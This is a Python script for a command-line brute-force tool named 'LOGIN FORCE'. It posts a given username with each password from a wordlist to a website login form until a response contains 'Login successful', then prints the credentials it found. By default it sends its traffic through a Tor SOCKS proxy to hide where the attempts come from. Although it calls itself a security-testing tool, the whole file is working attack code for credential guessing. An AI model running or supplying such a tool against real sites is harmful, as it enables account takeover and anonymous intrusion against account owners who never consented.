import requests
import sys
import argparse
from pyfiglet import figlet_format
from urllib.parse import urlparse

# Display banner for the tool
def show_banner():
    print(figlet_format("LOGIN FORCE"))
    print("""
    A powerful brute-force tool for testing login page security.
    Developer: magician slime
    """)

# Function to validate URL
def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

# Function to read proxy from file or use default Tor proxy
def get_proxies(proxy_file=None):
    if proxy_file:
        try:
            with open(proxy_file, 'r') as file:
                proxies = [line.strip() for line in file]
            return {'http': proxies[0], 'https': proxies[0]}
        except FileNotFoundError:
            print("Error: Proxy list file not found.")
            sys.exit(1)
        except IndexError:
            print("Error: Proxy list file is empty.")
            sys.exit(1)
    else:
        # Default to Tor proxy
        return {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}

# Function to perform brute force
def brute_force_login(url, username, password_list, proxies):
    print("Starting brute force attack...\n")
    try:
        with open(password_list, 'r') as file:
            for password in file:
                password = password.strip()
                data = {
                    'username': username,
                    'password': password
                }
                try:
                    response = requests.post(url, data=data, proxies=proxies)
                    if response.status_code == 200 and "Login successful" in response.text:
                        print(f"[+] Found valid credentials: {username}:{password}")
                        return
                    else:
                        print(f"[-] Tried: {username}:{password}")
                except requests.RequestException as e:
                    print(f"Error during request: {e}")
    except FileNotFoundError:
        print("Error: Password list file not found.")

    print("Brute force completed. No valid credentials found.")

# Main function with command-line interface
def main():
    parser = argparse.ArgumentParser(description="LOGIN FORCE: A brute force tool for testing website login pages.")
    parser.add_argument('-u', '--url', required=True, help="URL of the login page.")
    parser.add_argument('-U', '--username', required=True, help="Username for login.")
    parser.add_argument('-P', '--password-list', required=True, help="Path to the password list file.")
    parser.add_argument('-p', '--proxy-file', help="Path to the proxy list file (optional).")

    args = parser.parse_args()

    url = args.url
    if not is_valid_url(url):
        print("Error: The provided URL is not valid.")
        sys.exit(1)

    username = args.username
    password_list = args.password_list
    proxy_file = args.proxy_file

    proxies = get_proxies(proxy_file)
    
    brute_force_login(url, username, password_list, proxies)

if __name__ == "__main__":
    show_banner()
    main()
